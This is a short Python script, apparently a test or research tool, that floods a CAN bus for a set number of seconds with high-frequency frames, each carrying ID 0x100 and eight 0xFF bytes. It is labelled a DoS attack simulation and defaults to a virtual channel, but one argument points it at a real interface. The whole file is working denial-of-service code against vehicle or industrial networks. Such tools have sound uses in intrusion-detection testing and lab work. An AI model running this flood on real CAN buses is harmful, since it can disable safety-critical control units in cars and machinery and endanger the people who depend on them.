#!/usr/bin/env python3
import argparse
import time

import can


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="CAN DoS/flood attack simulation")
    parser.add_argument("--duration", type=float, default=5.0, help="Attack duration in seconds")
    parser.add_argument("--channel", default="vcan0", help="CAN channel")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    bus = can.Bus(channel=args.channel, interface="socketcan")

    start = time.time()
    sent = 0
    while time.time() - start < args.duration:
        msg = can.Message(arbitration_id=0x100, data=[0xFF] * 8, is_extended_id=False)
        bus.send(msg)
        sent += 1

    print(f"DoS complete: sent {sent} high-frequency frames in {args.duration:.1f}s")


if __name__ == "__main__":
    main()
